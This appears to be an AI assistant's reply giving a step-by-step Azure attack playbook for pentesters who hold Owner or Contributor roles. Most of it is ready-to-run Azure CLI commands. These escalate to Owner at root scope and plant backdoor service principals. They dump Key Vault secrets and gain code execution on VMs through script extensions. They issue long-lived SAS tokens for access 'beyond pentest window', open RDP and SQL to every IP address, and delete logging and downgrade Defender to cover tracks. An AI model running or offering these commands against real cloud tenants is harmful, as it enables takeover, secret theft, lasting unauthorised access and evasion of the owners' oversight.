Excellent question 👌 — if in your pentest you discover **Owner** and **Contributor** role assignments, you’re at the point where exploitation becomes **hands-on**.

Here’s how you think and proceed like a cloud attacker:

---

# 🔐 Exploiting Owner / Contributor Roles in Azure

---

## 📌 Step 1 – Understand the Difference

* **Owner** → Full control, including ability to assign roles. 🚨
* **Contributor** → Full control over resources (create/modify/delete), **but cannot assign RBAC roles**.

➡️ **Owner = immediate tenant takeover**
➡️ **Contributor = resource-level exploitation (VM takeover, Key Vault secrets, persistence)**

---

## 📌 Step 2 – Owner Role Exploitation

If you have **Owner**, you can escalate to *any* role:

```bash
# Escalate to Global Reader/Admin
az role assignment create --assignee <your-object-id> --role "User Access Administrator" --scope /subscriptions/<sub-id>

# Or directly make yourself Owner at root scope
az role assignment create --assignee <your-object-id> --role "Owner" --scope /
```

From here:

* Add backdoor Service Principals:

  ```bash
  az ad sp create-for-rbac --name "pentest-backdoor" --role Owner
  ```
* Assign **your user/SPN** to Key Vaults, SQL, Storage, etc.
* You now control **everything inside subscription**.

---

## 📌 Step 3 – Contributor Role Exploitation

With **Contributor**, focus on abusing **resource write permissions**:

### 3.1 Key Vault Access

* If vault exists, assign policy to yourself:

  ```bash
  az keyvault set-policy --name <vault> --object-id <you> --secret-permissions get list
  ```
* Dump secrets:

  ```bash
  az keyvault secret list --vault-name <vault>
  az keyvault secret show --vault-name <vault> --name <secret>
  ```

➡️ Secrets = DB creds, service principals, API keys.

---

### 3.2 Virtual Machine Takeover

* Deploy malicious extension:

  ```bash
  az vm extension set --publisher Microsoft.Compute \
    --name CustomScriptExtension --vm-name <vm> --resource-group <rg> \
    --settings '{"commandToExecute":"powershell -Command whoami > C:\\loot.txt"}'
  ```

➡️ Achieve **RCE on VM**.

* Create snapshots:

  ```bash
  az snapshot create --resource-group <rg> --source <disk-id> --name snap1
  ```

➡️ Offline extraction of creds, hashes, config.

---

### 3.3 Storage Exploitation

* Upload or overwrite blobs:

  ```bash
  az storage blob upload --account-name <acct> -c <container> -f test.txt -n test.txt
  ```

➡️ Malware hosting, supply chain attacks.

* Generate long-lived SAS token:

  ```bash
  az storage account generate-sas --permissions acdlrw --services b --resource-types sco --expiry 2030-01-01 --account-name <acct>
  ```

➡️ Persistence & exfil beyond pentest window.

---

### 3.4 Networking Exploitation

* Modify NSGs to expose services:

  ```bash
  az network nsg rule create --resource-group <rg> --nsg-name <nsg> \
    --name OpenRDP --priority 100 --direction Inbound --access Allow --protocol Tcp --destination-port-ranges 3389
  ```

➡️ Open RDP/SSH for exploitation.

* Expose SQL Server:

  ```bash
  az sql server firewall-rule create --resource-group <rg> --server <sql> \
    --name OpenAll --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255
  ```

➡️ External DB compromise.

---

## 📌 Step 4 – Persistence

Whether Owner or Contributor, attackers try to **stay inside the tenant**:

* Create Service Principal backdoors:

  ```bash
  az ad sp create-for-rbac --name "hidden-backdoor" --role Contributor
  ```
* Deploy automation accounts / runbooks:

  ```bash
  az automation runbook create --resource-group <rg> --automation-account-name <aa> \
    --name evilRunbook --type PowerShell --location eastus
  ```
* Use **SAS tokens** for persistent storage access.

---

## 📌 Step 5 – Cover Tracks / Defense Evasion

* Disable logging:

  ```bash
  az monitor diagnostic-settings delete --name diag1 --resource <resource-id>
  ```
* Downgrade Defender:

  ```bash
  az security pricing update --name VirtualMachines --tier Free
  ```

---

## 📌 Step 6 – Build Attack Paths

* **Contributor → Key Vault → Secrets → DB takeover → Persistence**
* **Contributor → VM RCE → Lateral movement → Backdoor SPN**
* **Owner → Assign more Owners → Full environment control**

---

✅ **In practice:**

* If you see **Owner** → test RBAC escalation & persistence creation.
* If you see **Contributor** → test Key Vault, VM, Storage, Networking, Automation.

---

## 🔎 Ways to Find Your Object ID

### **1. Signed-in user (your account)**

```bash
az ad signed-in-user show --query objectId -o tsv
```

➡️ Returns the **Object ID** of your current account.

---

### **2. For any user**

```bash
az ad user list --query "[].{Name:displayName, UserPrincipalName:userPrincipalName, ObjectId:id}" -o table
```

➡️ Lists **all users with their Object IDs**.

---

### **3. For service principals (SPNs / apps)**

```bash
az ad sp list --query "[].{AppId:appId, DisplayName:displayName, ObjectId:id}" -o table
```

➡️ Useful when you want to give/remove access for SPNs.

---

### **4. For groups**

```bash
az ad group list --query "[].{Name:displayName, ObjectId:id}" -o table
```

➡️ Handy if assigning permissions to groups.

---

### **5. For yourself (via portal UI)**

* Go to **Azure Portal → Azure Active Directory → Users**
* Search your username → open profile → **Object ID** is listed there.

---

📌 Example Output:

```
Name        UserPrincipalName         ObjectId
----------  ------------------------  ------------------------------------
John Doe    john.doe@contoso.com      4f9c0c7b-1234-5678-9abc-def123456789
```

So when running something like:

```bash
az role assignment create --assignee 4f9c0c7b-1234-5678-9abc-def123456789 --role Owner --scope /subscriptions/<sub-id>
```

That Object ID is what you substitute.

---
